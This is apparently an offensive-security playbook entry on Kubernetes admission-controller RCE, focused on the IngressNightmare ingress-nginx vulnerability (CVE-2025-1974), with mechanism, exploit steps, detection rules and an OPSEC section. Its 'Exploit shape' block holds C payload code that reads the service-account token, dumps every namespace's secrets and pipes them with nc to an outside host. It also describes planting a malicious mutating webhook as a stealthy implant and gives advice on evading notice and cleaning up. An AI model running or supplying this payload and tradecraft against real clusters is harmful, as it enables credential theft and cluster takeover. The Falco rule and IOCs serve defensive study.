# Ingress & Admission-Controller RCE

ATT&CK: T1190 (Exploit Public-Facing/Internal Application), T1552.007 (Container API), T1613
(Container Discovery) · CWE-94 (Code Injection), CWE-863 (Incorrect Authorization), CWE-1188 (Insecure
Default), CWE-522 (Insufficiently Protected Credentials).

Admission controllers are in-cluster web servers that the API server calls to validate/mutate objects.
They typically have a **highly privileged ServiceAccount** (the ingress-nginx controller can read
Secrets across all namespaces) and often **lack authentication** for direct calls — so a pod that can
reach them on the cluster network can drive them to RCE, then loot every namespace's secrets.

## IngressNightmare — CVE-2025-1974 (+ the annotation chain)

Discovered by Wiz (late 2024), disclosed 2025-03-24. Five CVEs collectively "IngressNightmare":
**CVE-2025-1974** (CVSS 9.8, unauth RCE — the critical one), plus CVE-2025-24514, CVE-2025-1097,
CVE-2025-1098 (annotation-injection bugs), and CVE-2025-24513 (no RCE). Wiz: ~43% of cloud
environments and 6,500+ clusters exposed (incl. Fortune-500). Note: EKS/GKE don't install
ingress-nginx by default, so managed clusters aren't affected out of the box.

### Mechanism
ingress-nginx ships a **validating admission webhook** (`AdmissionReview`) that, when a new/updated
`Ingress` object is submitted, renders the proposed NGINX config and tests it with `nginx -t`. The
webhook server generally **lacks strict authentication** and is reachable from any pod on the cluster
network. The chain:

1. **Stage a payload `.so` in the controller's memory/fs.** NGINX buffers large request bodies to a
   temp file; the file is referenced via `/proc/<pid>/fd/<fd>` and stays accessible even after being
   unlinked (marked for deletion). Upload a malicious shared object as a big request body.
2. **Inject an NGINX directive.** The injection lands in the AdmissionReview `UID` parameter (not a
   real annotation), so the annotation regex sanitizer never sees it — directives like `ssl_engine`
   get inserted verbatim into the tested config.
3. **Trigger code exec during validation.** The injected `ssl_engine /proc/<pid>/fd/<fd>` makes
   `nginx -t` `dlopen()` the buffered `.so`, executing attacker code **in the controller pod**. The
   correct `<pid>/<fd>` is found by a short brute-force loop. The companion annotation bugs
   (`auth-url`, `auth-tls-match-cn`, `mirror-target`) provide alternate injection points to chain in.

Code runs in `nginx -t` (validation, not the live config), which narrows usable directives but is
enough for `ssl_engine`-based `dlopen`.

### Exploit shape
```bash
# 0. From a pod on the cluster network, locate the admission webhook service:
kubectl get validatingwebhookconfigurations -o yaml | grep -A3 ingress-nginx
ADMISSION=https://ingress-nginx-controller-admission.ingress-nginx.svc:443

# 1. Build a payload .so (constructor runs inside the controller pod):
cat > p.c <<'EOF'
#include <stdlib.h>
__attribute__((constructor)) void x(){ system(
  "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);"
  "kubectl --token=$TOKEN get secrets -A -o json | nc 10.0.0.9 443"); }
EOF
gcc -shared -fPIC -o payload.so p.c

# 2. Upload .so via a large body so it lands in /proc/<pid>/fd/<fd>, then submit a crafted
#    AdmissionReview whose UID injects:  ssl_engine /proc/<pid>/fd/<fd>;
#    brute-forcing pid/fd. The public Wiz/ProjectDiscovery PoCs automate steps 1-3.
```
The exploit needs network access to the admission service — in practice run it from an in-cluster
vantage (a foothold pod, an SSRF, or a misconfigured Job). `scripts/escape_enum.sh` reports the
ingress-nginx controller version (`/nginx-ingress-controller --version` or the image tag) so you can
confirm it is `< 1.11.5` / `< 1.12.1` before attempting.

### Impact → cluster takeover
The controller SA is highly privileged (reads Secrets cluster-wide). RCE in the controller pod ⇒ dump
all-namespace Secrets (TLS keys, cloud creds, other SA tokens) ⇒ pivot to cluster-admin. Affected
ingress-nginx `< 1.11.5` and `< 1.12.1`; **fixed 1.11.5 / 1.12.1**.

## General admission-webhook abuse (beyond IngressNightmare)

- **Unauthenticated/over-permissioned webhooks.** Any admission service reachable from workload pods is
  attack surface; enumerate with `kubectl get validating/mutatingwebhookconfigurations`. A webhook with
  a broad SA + a parsing/exec bug is an RCE+secrets path.
- **Webhook config tampering.** With `update/patch` on `*webhookconfigurations` (see
  k8s-rbac-escalation.md), an attacker can *disable* a security webhook (open the door for privileged
  pods) or *install a malicious mutating webhook* that injects sidecars/credentials or harvests every
  object the API server admits — a powerful, stealthy cluster-wide implant.

## Detection

**Sysdig/Falco — shared-library load from /proc in the ingress controller (the IngressNightmare tell):**
```yaml
- rule: Potential IngressNightmare Exploitation
  desc: nginx loading a shared object from a /proc fd path during config validation
  condition: >
    spawned_process and container and proc.name in (nginx) and
    (proc.cmdline contains "ssl_engine" or proc.cmdline contains "/proc/" ) and
    proc.aname[1]="nginx-ingress-controller"
  output: "IngressNightmare RCE attempt (cmd=%proc.cmdline cid=%container.id)"
  priority: CRITICAL
  tags: [T1190, container]
```
**Network/admission:** alert on AdmissionReview requests to the webhook from sources other than the
API server; restrict the admission Service so **only the API server** can reach it (NetworkPolicy).
**Version inventory:** ingress-nginx `< 1.11.5`/`< 1.12.1`. **IOCs:** `nginx` `dlopen` of a `.so`
under `/proc/<pid>/fd/<fd>`; oversized request bodies to the controller; `ssl_engine`/`configuration-snippet`
in submitted Ingress objects; controller SA suddenly listing Secrets cluster-wide; new/modified
`MutatingWebhookConfiguration` pointing at an external/odd endpoint.

## OPSEC

- Code runs inside the controller pod, not on the node — it is a credential-theft / cluster-pivot
  primitive, not a host escape (chain into k8s-rbac-escalation.md / node-host-pivot.md afterward).
- The brute-force pid/fd loop and oversized bodies generate controller access-log noise; the `.so` is
  unlinked but resident — minimize footprint and exfil quickly.
- Cleanup: remove any Ingress objects you created, any malicious webhook you installed
  (`kubectl delete mutatingwebhookconfiguration <name>`), and rotate-aware (the controller SA you used
  is logged). API audit retains the object create/update events.

## References

- Wiz Research, "CVE-2025-1974: The IngressNightmare in Kubernetes"; ProjectDiscovery, "IngressNightmare:
  Unauth RCE in Ingress NGINX (CVE-2025-1974)."
- Kubernetes / ingress-nginx security advisory GHSA (CVE-2025-1974, -24514, -1097, -1098, -24513).
- Sysdig, "Detecting and Mitigating IngressNightmare – CVE-2025-1974"; FortiGuard / Invicti analyses.
- Kubernetes Docs — Dynamic Admission Control; admission-webhook security guidance.
